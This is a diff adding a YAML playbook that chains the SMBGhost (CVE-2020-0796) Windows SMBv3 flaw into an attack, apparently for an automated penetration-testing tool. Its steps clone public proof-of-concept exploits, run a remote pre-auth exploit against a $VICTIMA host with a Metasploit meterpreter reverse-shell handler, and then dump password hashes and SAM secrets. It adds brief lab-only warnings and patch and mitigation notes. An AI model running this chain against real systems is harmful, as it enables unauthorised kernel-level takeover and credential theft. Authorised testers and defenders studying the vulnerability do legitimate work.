@@ -1,0 +1,77 @@
+chain_id: smbghost_cve_2020_0796
+title: "Microsoft SMBv3 — CVE-2020-0796 SMBGhost compression header → kernel RCE"
+severity: CRITICAL
+tags: [smb, smbv3, windows, cve-2020-0796, smbghost, rce, unauth, kernel, wormable]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2020-0796" }
+    - { port: 445, service_pattern: "(?i)microsoft-ds|smb" }
+    - { product_pattern: "(?i)windows 10.*1903|windows 10.*1909|windows server.*1903|windows server.*1909" }
+
+description: |
+  Windows 10 1903 / 1909 and the matching Server Core editions
+  shipped a buggy SMBv3 compression header parser that integer-
+  overflows on a crafted COMPRESSION_TRANSFORM message — yielding
+  pre-auth SYSTEM RCE in `srv2.sys`. Wormable, comparable to
+  EternalBlue. Public PoCs work but routinely BSOD targets; treat
+  it like BlueKeep — verify in the lab, never blind-fire on prod.
+
+steps:
+  - id: 1
+    title: "Cheap detection via nmap NSE"
+    command: |
+      nmap -p 445 --script smb-protocols,smb2-capabilities,smb-vuln-cve-2020-0796 $VICTIMA
+
+  - id: 2
+    title: "Standalone scanner from danigargu (no exploit)"
+    command: |
+      git clone https://github.com/ollypwn/SMBGhost /tmp/smbghost
+      python3 /tmp/smbghost/scanner.py $VICTIMA
+
+  - id: 3
+    title: "Local-privesc PoC (run on a low-priv foothold) — most reliable"
+    command: |
+      git clone https://github.com/danigargu/CVE-2020-0796 /tmp/cve_0796
+      cd /tmp/cve_0796/LPE
+      # Build with VS, drop the EXE, run as low-priv user → SYSTEM cmd.exe
+      .\\\\SMBGhost_LPE_dlink.exe
+
+  - id: 4
+    title: "Remote pre-auth exploit (lab only — BSOD-prone)"
+    command: |
+      git clone https://github.com/chompie1337/SMBGhost_RCE_PoC /tmp/smbghost_rce
+      python3 /tmp/smbghost_rce/exploit.py -ip $VICTIMA \
+        -lhost 10.0.2.15 -lport 4444
+      # Pair with a Metasploit handler:
+      msfconsole -qx 'use exploit/multi/handler; \
+        set PAYLOAD windows/x64/meterpreter/reverse_tcp; \
+        set LHOST 10.0.2.15; set LPORT 4444; run'
+
+  - id: 5
+    title: "Post-exploit — pull hashes, then move on quickly"
+    command: |
+      # The host is unstable after exploitation. Dump and leave:
+      hashdump
+      load kiwi
+      lsa_dump_sam
+      # Then migrate to a stable process and disconnect cleanly.
+
+common_errors:
+  - error: "scanner says NOT VULNERABLE"
+    solution: |
+      Either patched (KB4551762 — March 2020) or compression is
+      disabled (`Set-ItemProperty -Path
+      HKLM:\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\LanmanServer\\\\Parameters
+      -Name DisableCompression -Type DWORD -Value 1`). If the host
+      still runs 1903/1909 it is past EOL — flag the build to the
+      blue team.
+  - error: "BSOD on the remote PoC"
+    solution: |
+      Expected. The remote exploit relies on a tight srv2 pool
+      layout that varies by KB level. Use the LPE PoC from a
+      different foothold instead.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2020-0796
+  - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0796
